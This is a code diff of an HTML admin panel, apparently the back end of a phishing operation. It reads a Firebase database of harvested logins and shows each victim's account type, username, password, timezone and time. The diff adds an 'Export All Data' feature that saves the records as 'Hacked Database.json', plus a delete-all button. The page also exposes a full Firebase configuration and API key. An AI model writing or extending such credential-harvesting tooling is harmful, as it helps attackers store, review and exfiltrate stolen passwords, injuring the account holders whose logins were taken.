@@ -3,7 +3,6 @@
 <head>
   <title>Database</title>
   <style>
-    /* Add your CSS styles here */
     body {
       font-family: Arial, sans-serif;
     }
@@ -26,60 +25,141 @@
     .send:hover {
       background-color: #c0392b;
     }
+    .export {
+      background-color: #2f9e1e;
+      color: white;
+      border: none;
+      padding: 5px 10px;
+      cursor: pointer;
+    }
+    .export:hover {
+      background-color: #2dc02b;
+    }
+    #scrollButtons {
+      text-align: center;
+      margin-top: 10px;
+    }
+    .scroll-icon {
+      font-size: 24px;
+      cursor: pointer;
+    }
+    #scrollButtons {
+      text-align: center;
+      margin-top: 10px;
+    }
+    .scroll-icon {
+      font-size: 24px;
+      cursor: pointer;
+    }
   </style>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
 <body>
+  <div id="scrollButtons">
+    <i class="fas fa-chevron-circle-down scroll-icon" onclick="scrollToBottom()"></i>
+  </div>
   <div></div>
   <div id="save"></div>
-
   <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
   <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
   <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
-
   <script>
-const firebaseConfig = {
-  apiKey: "AIzaSyDhn80byD69jCo4oexdKdkCHUgGw9nO6CM",
-  authDomain: "dubai4db.firebaseapp.com",
-  databaseURL: "https://dubai4db-default-rtdb.firebaseio.com",
-  projectId: "dubai4db",
-  storageBucket: "dubai4db.appspot.com",
-  messagingSenderId: "776520121975",
-  appId: "1:776520121975:web:248815949672b2c4371072"
-};
-
+    const firebaseConfig = {
+      apiKey: "AIzaSyDhn80byD69jCo4oexdKdkCHUgGw9nO6CM",
+      authDomain: "dubai4db.firebaseapp.com",
+      databaseURL: "https://dubai4db-default-rtdb.firebaseio.com",
+      projectId: "dubai4db",
+      storageBucket: "dubai4db.appspot.com",
+      messagingSenderId: "776520121975",
+      appId: "1:776520121975:web:248815949672b2c4371072"
+    };
     firebase.initializeApp(firebaseConfig);
-    firebase.auth().signInAnonymously().catch(function(error) {
-      var errorCode = error.code;
-      var errorMessage = error.message;
-      window.alert("Error: " + errorMessage);
-    });
-
+    async function signInAnonymously() {
+      try {
+        await firebase.auth().signInAnonymously();
+      } catch (error) {
+        console.error("Error:", error.message);
+      }
+    }
+    signInAnonymously();
+    const saveContainer = document.getElementById("save");
     firebase.database().ref("fbdet").on("child_added", function(snapshot) {
-      var html = "";
-      html += "<div class='canvaschat'>";
-      html += "<hr>";
-      html += "<p><b>Account type:</b> " + snapshot.val().type + "</p>";
-      html += "<p><b>User:</b> " + snapshot.val().emle + "</p>";
-      html += "<p><b>Password:</b> " + snapshot.val().pass + "</p>";
-      html += "<p><b>Date:</b> " + snapshot.val().date + "</p>";
-      html += "<p><b>Location:</b> " + snapshot.val().timezone + "</p>";
-      html += "<p><b>Time:</b> " + snapshot.val().time + "</p>";
-      html += "<button data-id='" + snapshot.key + "' onclick='deleteMessage(this);' class='send'>Delete</button>";
-      html += "</div>";
-      document.getElementById("save").innerHTML += html;
+      const html = createChatEntry(snapshot);
+      saveContainer.appendChild(html);
     });
-
-    function deleteMessage(self) {
-      var messageId = self.getAttribute("data-id");
+    function createChatEntry(snapshot) {
+      const chatDiv = document.createElement("div");
+      chatDiv.className = "canvaschat";
+      chatDiv.innerHTML = `
+        <hr>
+        <p><b>Account type:</b> ${snapshot.val().type}</p>
+        <p><b>User:</b> ${snapshot.val().emle}</p>
+        <p><b>Password:</b> ${snapshot.val().pass}</p>
+        <p><b>Date:</b> ${snapshot.val().date}</p>
+        <p><b>Location:</b> ${snapshot.val().timezone}</p>
+        <p><b>Time:</b> ${snapshot.val().time}</p>
+        <button data-id="${snapshot.key}" class="send">Delete</button>`;
+      return chatDiv;
+    }
+    saveContainer.addEventListener("click", function(event) {
+      if (event.target && event.target.classList.contains("send")) {
+        deleteMessage(event.target);
+      }
+    });
+    function deleteMessage(button) {
+      const messageId = button.getAttribute("data-id");
       firebase.database().ref("fbdet").child(messageId).remove();
     }
-
     firebase.database().ref("fbdet").on("child_removed", function(snapshot) {
-      var messageElement = document.getElementById("message-" + snapshot.key);
+      const messageElement = document.getElementById("message-" + snapshot.key);
       if (messageElement) {
         messageElement.innerHTML = "Deleted";
       }
     });
+
+    function exportAllData() {
+      const confirmExport = confirm("Are you sure you want to export all data?");
+      if (confirmExport) {
+        firebase.database().ref("fbdet").once("value").then((dataSnapshot) => {
+          const data = dataSnapshot.val();
+          const jsonData = JSON.stringify(data, null, 2);
+          const blob = new Blob([jsonData], { type: "application/json" });
+          const url = URL.createObjectURL(blob);
+
+          const a = document.createElement("a");
+          a.href = url;
+          a.download = "Hacked Database.json";
+          a.textContent = "Export All Data";
+          a.style.marginTop = "10px";
+          a.style.display = "block";
+
+          document.body.appendChild(a);
+        });
+      }
+    }
+    function deleteAllData() {
+      const confirmDelete = confirm("Are you sure you want to delete all data?");
+      if (confirmDelete) {
+        firebase.database().ref("fbdet").remove();
+        // Clear the container
+        saveContainer.innerHTML = "";
+      }
+    }
+    function scrollToTop() {
+      window.scrollTo(0, 0);
+    }
+    function scrollToBottom() {
+      window.scrollTo(0, document.body.scrollHeight);
+    }
   </script>
+  <div>
+    <button onclick="exportAllData()"class="export">Export All Data</button>
+  </div><br>
+  <div>
+    <button onclick="deleteAllData()"class="send delete-all-button">Delete All Data</button>
+  </div>
+  <div id="scrollButtons">
+    <i class="fas fa-chevron-circle-up scroll-icon" onclick="scrollToBottom()"></i>
+  </div>
 </body>
 </html>
